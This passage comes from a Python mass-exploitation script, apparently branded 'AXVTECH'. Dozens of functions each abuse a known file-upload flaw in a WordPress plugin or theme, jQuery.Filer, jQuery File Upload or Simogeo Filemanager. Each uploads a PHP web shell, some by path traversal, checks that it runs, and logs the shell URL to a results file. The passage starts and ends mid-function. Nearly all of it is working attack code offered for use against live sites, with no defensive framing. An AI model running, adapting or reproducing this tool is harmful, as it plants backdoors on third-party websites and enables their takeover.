		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Reflex Gallery -->> {red}Not Vuln !")
	except:pass
 
def Snetworking(url):
	try:
		data = {'image':open(phpjpg, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/social-networking-e-commerce-1/classes/views/social-options/form_cat_add.php')
		c = ('http://' + url+'/wp-content/plugins/social-networking-e-commerce-1/images/axv.php.jpg')
		requests.post(p, headers=ua, data={'config_path':'../../../../../../'}, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Social Networking -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Social Networking -->> {red}Not Vuln !")
	except:pass
 
def Phpevent(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/php-event-calendar/server/file-uploader/')
		c = ('http://' + url+'/wp-content/plugins/php-event-calendar/server/file-uploader/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Php Event -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Php Event -->> {red}Not Vuln !")
	except:pass
 
def Blasze(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-admin/admin.php?page=blaze_manage')
		c = ('http://' + url+'/wp-content/uploads/blaze/uploadfolder/big/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Blaze -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Blaze -->> {red}Not Vuln !")
	except:pass
 
def Symposium(url):
	try:
		data = {'fileToUpload':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wp-symposium/js/uploadify/uploadify.php')
		c = ('http://' + url+'/wp-content/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Symposium -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Symposium -->> {red}Not Vuln !")
	except:pass
 
def Copysafe(url):
	try:
		data = {'wpcsp_file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php')
		c = ('http://' + url+'/wp-content/uploads/axv.php')
		requests.post(p, headers=ua, data={'upload_path': '../../../../uploads/'}, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Wp Copysafe -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Wp Copysafe -->> {red}Not Vuln !")
	except:pass
 
def Wpuserf(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-ajax.php?action=wpuf_file_upload')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Wp Userfrontend -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Wp Userfrontend -->> {red}Not Vuln !")
	except:pass
 
def Mobilef(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/server/images.php')
		c = ('http://' + url+'/wp-content/plugins/mobile-friendly-app-builder-by-easytouch/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Mobile Friendly -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Mobile Friendly -->> {red}Not Vuln !")
	except:pass
 
def Viralop(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/viral-optins/api/uploader/file-uploader.php')
		c = ('http://' + url+'/wp-content/uploads/'+str(tahun)+'/'+str(bulan)+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Viral Optins -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Viral Optins -->> {red}Not Vuln !")
	except:pass
 
def Secfiles(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/omni-secure-files/plupload/examples/upload.php')
		c = ('http://' + url+'/wp-content/plugins/omni-secure-files/plupload/examples/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Omni Secure Files -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Omni Secure Files -->> {red}Not Vuln !")
	except:pass
 
def Checkout(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wp-checkout/vendors/uploadify/upload.php')
		c = ('http://' + url+'/wp-content/uploads/wp-checkout/uploadify/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}WP Checkout -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}WP Checkout -->> {red}Not Vuln !")
	except:pass
 
def Purevision(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/purevision/scripts/admin/uploadify/uploadify.php')
		c = ('http://' + url+'/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Purevision -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Purevision -->> {red}Not Vuln !")
	except:pass
 
def Multimedia(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/themes/multimedia1/server/php/')
		c = ('http://' + url+'/wp-content/themes/multimedia1/server/php/files/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Multimedia -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Multimedia -->> {red}Not Vuln !")
	except:pass
 
def Inmarketing(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/inboundio-marketing/admin/partials/csv_uploader.php')
		c = ('http://' + url+'/wp-content/plugins/inboundio-marketing/admin/partials/uploaded_csv/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Inboundio Marketing -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Inboundio Marketing -->> {red}Not Vuln !")
	except:pass
 
def Fileupload(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-admin/options-general.php?page=wordpress_file_upload&action=edit_settings')
		c = ('http://' + url+'/wp-admin/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}File Upload -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}File Upload -->> {red}Not Vuln !")
	except:pass
 
def Logosware(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/logosware-suite-uploader/lw-suite-uploader.php')
		c = ('http://' + url+'/wp-content/plugins/logosware-suite-uploader/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Logosware Suite Uploader -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Logosware Suite Uploader -->> {red}Not Vuln !")
	except:pass
 
def Dzszsound(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/dzs-zoomsounds/admin/upload.php')
		c = ('http://' + url+'/wp-content/plugins/dzs-zoomsounds/admin/upload/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Dzs Zoomsounds -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Dzs Zoomsounds -->> {red}Not Vuln !")
	except:pass
 
def Iphone(url):
	try:
		data = {'Filedata':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/i-dump-iphone-to-wordpress-photo-uploader/uploader.php')
		c = ('http://' + url+'/wp-content/uploads/i-dump-uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Dzs Zoomsounds -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Dzs Zoomsounds -->> {red}Not Vuln !")
	except:pass
 
def Levoslide(url):
	try:
		data = {'Filedata':open(phpjpg, 'rb')}
		p = ('https://' + url + '/wp-admin/admin.php?page=levoslideshow_manage')
		c = ('http://' + url+'/wp-content/uploads/levoslideshow/42_uploadfolder/big/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Levoslideshow -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Levoslideshow -->> {red}Not Vuln !")
	except:pass
 
def Jssorup(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-ajax.php?param=upload_slide&action=upload_library')
		c = ('http://' + url+'/wp-content/jssor-slider/jssor-uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Jssor Uploads -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Jssor Uploads -->> {red}Not Vuln !")
	except:pass
 
def Lineexplo(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-post.php')
		c = ('http://' + url+'/wp-content/axv.php')
		requests.post(p, headers=ua, data={'settins_upload': 'settings', 'page': 'pagelines'}, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Page Line -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Page Line -->> {red}Not Vuln !")
	except:pass
 
def Pageline(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-admin/admin-post.php')
		c = ('http://' + url+'/wp-content/axv.php')  
		requests.post(p, headers=ua, data={'Settings2_upload': 'Settings2', 'page': 'pagelines'}, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Page Lines 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Page Lines 2 -->> {red}Not Vuln !")
	except:pass
 
def Mail(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wp-mailinglist/vendors/uploadify/upload.php')
		c = ('http://' + url+'/wp-content/uploads/wp-mailinglist/axv.php')
		requests.post(p, headers=ua,files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Page Lines 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Page Lines 2 -->> {red}Not Vuln !")
	except:pass
 
def Ajaxform(url):
	try:
		data = {'file':open(php, 'rb')}
		p = ('https://' + url + '/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/do.upload.php?form_id=afp')
		c = ('http://' + url+'/wp-content/plugins/wp-ajax-form-pro/ajax-form-app/uploader/uploads/axv.php')
		requests.post(p, headers=ua,files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Ajax Form Pro -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Ajax Form Pro -->> {red}Not Vuln !")
	except:pass


def jqueryfilerb(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/themes/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/themes/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer -->> {red}Not Vuln !")
	except:pass       
 
def jqueryfiler2(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/theme/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/theme/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 2 -->> {red}Not Vuln !")
	except:pass   
 
def jqueryfiler3(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/assets/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/assets/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 3 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 3 -->> {red}Not Vuln !")
	except:pass  

def jqueryfiler4(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/web/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/web/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 4 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 4 -->> {red}Not Vuln !")
	except:pass  

def jqueryfiler5(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/client/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/client/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 5 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 5 -->> {red}Not Vuln !")
	except:pass  
 
def jqueryfiler6(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/vendor/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/vendor/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 6 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 6 -->> {red}Not Vuln !")
	except:pass  
 
def jqueryfiler7(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/admin/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/admin/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 7 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 7 -->> {red}Not Vuln !")
	except:pass  
 
def jqueryfiler8(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/sistemas/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/sistemas/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 8 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 8 -->> {red}Not Vuln !")
	except:pass  
 
def jqueryfiler9(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/index/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/index/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 9 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 9 -->> {red}Not Vuln !")
	except:pass  
 
def jqueryfiler10(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/examples/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/examples/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 10 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 10 -->> {red}Not Vuln !")
	except:pass  
 
def jqueryfiler11(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/temp/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/temp/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 11 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 11 -->> {red}Not Vuln !")
	except:pass  
 
def jqueryfiler12(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/data/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/data/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 12 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 12 -->> {red}Not Vuln !")
	except:pass  
 
def jqueryfiler13(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 13 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 13 -->> {red}Not Vuln !")
	except:pass 
 
def jqueryfiler14(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/assets/vendor/jquery.filer/examples/default/php/form_upload.php')
		c = ('http://' + url+'/assets/vendor/jquery.filer/uploads/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 14 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery.Filer 14 -->> {red}Not Vuln !")
	except:pass 
 
def jqueryfileup(url):
	try:
		data = {'files':open(php, 'rb')}
		p = ('https://' + url + '/server/php/index.php')
		c = ('http://' + url+'/server/php/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload -->> {red}Not Vuln !")
	except:pass 
 
def jqueryfileup2(url):
	try:
		data = {'files':open(php, 'rb')}
		p = ('https://' + url + '/jQuery-File-Upload-9.22.0/server/php/index.php')
		c = ('http://' + url+'/jQuery-File-Upload-9.22.0/server/php/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 2 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 2 -->> {red}Not Vuln !")
	except:pass
 
def jqueryfileup3(url):
	try:
		data = {'files':open(php, 'rb')}
		p = ('https://' + url + '/vendor/server/php/index.php')
		c = ('http://' + url+'/vendor/server/php/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 3 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 3 -->> {red}Not Vuln !")
	except:pass
 
 
def jqueryfileu4(url):
	try:
		data = {'files':open(php, 'rb')}
		p = ('https://' + url + '/assets/vendor/server/php/index.php')
		c = ('http://' + url+'/assets/vendor/server/php/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 4 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 4 -->> {red}Not Vuln !")
	except:pass
 
def jqueryfileu5(url):
	try:
		data = {'files':open(php, 'rb')}
		p = ('https://' + url + '/jQuery-File-Upload/server/php/index.php')
		c = ('http://' + url+'/jQuery-File-Upload/server/php/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 5 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 5 -->> {red}Not Vuln !")
	except:pass
 
def jqueryfileu6(url):
	try:
		data = {'files':open(php, 'rb')}
		p = ('https://' + url + '/jqueryfileupload/server/php/index.php')
		c = ('http://' + url+'/jqueryfileupload/server/php/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 6 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 6 -->> {red}Not Vuln !")
	except:pass
 
def jqueryfileu7(url):
	try:
		data = {'files':open(php, 'rb')}
		p = ('https://' + url + '/uploads/server/php/index.php')
		c = ('http://' + url+'/uploads/server/php/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 7 -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}jQuery File Upload 7 -->> {red}Not Vuln !")
	except:pass
 
def simogeo(url):
	try:
		data = {'newfile':open(php, 'rb')}
		p = ('https://' + url + '/Filemanager/connectors/php/filemanager.php?config=filemanager.config.js')
		pp = ('https://' + url + '/Filemanager/connectors/php/filemanager.php?mode=rename&old=%2FFilemanager%2Fuserfiles%2Fup.txt&new=....//axv.php&config=filemanager.config.js')
		c = ('http://' + url+'/Filemanager/userfiles/axv.php')
		requests.post(p, headers=ua, data={'mode':'add', 'currentpath':'/Filemanager/userfiles/'}, files=data, timeout=20)
		get2 = requests.get(pp, headers=ua, timeout=9)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
			print(f"{blue}|- {white}http://{url} {white}| {yellow}Simogeo -->> {green}Exploited !")
			open('results/ShellsExploit.txt', 'a+').write(f"{c}\n")
		else:print(f"{blue}|- {white}http://{url} {white}| {yellow}Simogeo -->> {red}Not Vuln !")
	except:pass
 
def array(url):
	try:
		data = {'files[]':open(php, 'rb')}
		p = ('https://' + url + '/server/php/')
		c = ('http://' + url+'/server/php/files/axv.php')
		requests.post(p, headers=ua, files=data, timeout=20)
		get = requests.get(c, headers=ua, timeout=10)
		if 'AXVTECH' in get.text:
